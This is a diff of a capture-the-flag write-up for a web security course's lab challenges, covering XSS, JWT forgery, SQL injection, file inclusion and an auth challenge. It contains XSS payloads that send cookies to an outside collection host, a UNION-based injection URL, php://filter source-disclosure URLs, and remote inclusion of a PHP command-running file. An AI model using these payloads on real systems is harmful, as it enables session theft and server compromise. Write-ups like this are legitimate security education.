@@ -214,7 +214,6 @@ I thought no way it is admin's cookie, because my own cookies from this website 
 But I decided to try anyway after a while.
 ```
 <SCRIPT>var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=f_" + document.cookie, false);  x2.send();</SCrIpT>
-answer: https://eo2awd21wqscuhf.m.pipedream.net/?1=f_flag=BFS{XSS_M0R3_L!K3_FR33_C00K!35}
 ```
 Somehow the admin's cookie is NOT `HttpOnly` and it is the flag. Shrug
 
@@ -223,7 +222,67 @@ Very easy after whatsup1. Same thing except messages are sanitized so cannot be 
 What I entered for the image:
 ```
 1" onerror="var x2=new XMLHttpRequest(); x2.open('GET', 'https://eo2awd21wqscuhf.m.pipedream.net/?1=f_' + document.cookie, false);  x2.send();
-https://eo2awd21wqscuhf.m.pipedream.net/?1=f_flag=BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}
 ```
 
 # jwt
+## mythique1
+No signature checking. We literally just changed the cookie via https://dinochiesa.github.io/jwt/ and it worked.
+
+## mythique2
+By reading [this](https://blog.pentesteracademy.com/hacking-jwt-tokens-verification-key-mismanagement-iv-582601f9d8ac) I know there is vulnerability of using RS256 public key to craft a HS256 working signature.
+So by using [TokenBreaker](https://github.com/cyberblackhole/TokenBreaker) I was able to make a new jwt with:
+```
+python RsaToHmac.py -t *** -p ***
+```
+
+## mythique3
+Reading [this guide (Chinese)](https://si1ent.xyz/2020/10/21/JWT%E5%AE%89%E5%85%A8%E4%B8%8E%E5%AE%9E%E6%88%98/) inspired me. The signature is HS256 and short which means it can be bruteforced.
+So by using [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) I was able to bruteforce secret.
+![image](https://user-images.githubusercontent.com/43685348/221394412-fb4f3a8b-9097-45e1-94df-63ce717ec2f1.png)
+Then I just used secret to generate working jwt.
+
+# sqli
+## potionseller
+Detailed steps [here](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf) to SQL injection.
+
+First I tried 3+1, 5-1, neither worked to get 4.
+
+Then by using union select, I was able to union and order by descending price.
+```
+https://potionseller.secu-web.blackfoot.dev/potions/1%20union%20select%20id,name,description,price,img,longdescription%20from%20potions%20order%20by%20price%20desc
+```
+Side note using bitwise operation worked also somehow.
+```
+https://potionseller.secu-web.blackfoot.dev/potions/2%3C%3C1
+```
+
+## potionseller2
+I was not able to do this question. SQL injection on the potions side is now blocked, and the admin login I could not do any injection whatsoever. I even used SQL injection detection tools to auto crack it but no dice.
+Time based blind attack did not work neither. It did not wait any time when I tried.
+I think there must be some sort of input cleaning WAF that I am not able to get past.
+
+# lfi
+## no protection
+just do `https://noprotection.secu-web.blackfoot.dev/index.php?lang=flag.html`.
+
+## extprotect
+just do `https://extprotect.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config`. Then [decode](https://www.base64decode.org/) the answer.
+
+## filters
+Detailed explation [here](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html).
+By reading the source we know there is a `config.php`.
+Then I just did a `https://filters.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php`.
+
+## remote
+lfi explation [here](https://medium.com/blacksecurity/metasploitable-dvwa-lfi-rfi-b4054760e1b9). We know that we can make the website include [my own php file](https://remote.secu-web.blackfoot.dev/index.php?lang=https://moonlit-nature-343717.web.app/test.txt).
+What's in the php file:
+```
+<?php
+passthru("ls")
+?>
+```
+Now we find the hidden file via `ls`.
+
+# auth
+## auth50
+whats this? just admin password.
